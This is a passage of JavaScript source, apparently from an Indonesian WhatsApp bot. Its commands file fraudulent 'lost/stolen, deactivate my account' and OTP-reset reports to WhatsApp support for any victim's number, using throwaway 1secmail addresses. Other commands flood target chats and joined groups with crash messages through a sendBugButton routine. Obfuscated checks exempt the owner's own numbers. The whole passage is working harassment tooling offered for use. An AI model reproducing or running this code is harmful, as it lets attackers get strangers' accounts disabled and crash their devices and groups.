form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "resetotpv2":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", args[1])
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", "Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

// LOGOUT
case "logoutv1":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "logoutv2":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

case "🍅":
case "🌹":
case "☕":
case "☠️":
case "🌷":
case "🔥":{
if (!isDeveloper && !isAkses) return m.reply('Kamu belum bisa akses fitur ini.')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
m.reply('Proses⌛')
sendBugButton(target,30)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break

case "ganas":
case "hard":
case "turu":{
if (!isDeveloper && !isAkses) return m.reply('Kamu belum bisa akses fitur ini.')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
m.reply('Proses⌛')
sendBugButton(target,40)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break

case "trava":
case "bom":
case "troli":
case "dark":{
if (!isDeveloper && !isAkses) return m.reply('Kamu belum bisa akses fitur ini.')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
m.reply('Proses⌛')
sendBugButton(target,25)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break

case "bugchat":
case "santetpc":
case "bugpc":{
if (!isDeveloper && !isAkses) return m.reply('Kamu belum bisa akses fitur ini.')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
m.reply('Proses⌛')
sendBugButton(target,20)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "bomgc":
case "trolgc":
case "santetgc":
case "buggc":{
if (!isMeLexx) return m.reply('Owner Only')
if (!q) return m.reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await lexxy.groupAcceptInvite(result)
await sleep(1000)
m.reply('Proses⌛')
sendBugButton(rumgc,15)
await sleep(1000)
await lexxy.groupLeave(rumgc)
m.reply('Done ✅')
}
break

case "tes": case "runtime":{
m.reply(`Status Online:\n${runtime(process.uptime())}`)
}
break

case 'delakses':{
if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isDeveloper && !isGroupAdmins) return m.reply(`Fitur ini khusus owner`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await lexxy.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = bugchat.indexOf(ya)
bugchat.splice(unp, 1)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
delusr = ya+`@s.whatsapp.net`
mentions(`sukses delete akses @${delusr.split('@')[0]}`, [delusr])
}
break

case 'addakses':{
if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isDeveloper && !isGroupAdmins) return m.reply(`Fitur ini khusus owner`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await lexxy.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bugchat.push(yo)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
addusr = yo+`@s.whatsapp.net`
mentions(`sukses add akses @${addusr.split('@')[0]}`, [addusr])
}
break

default:
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})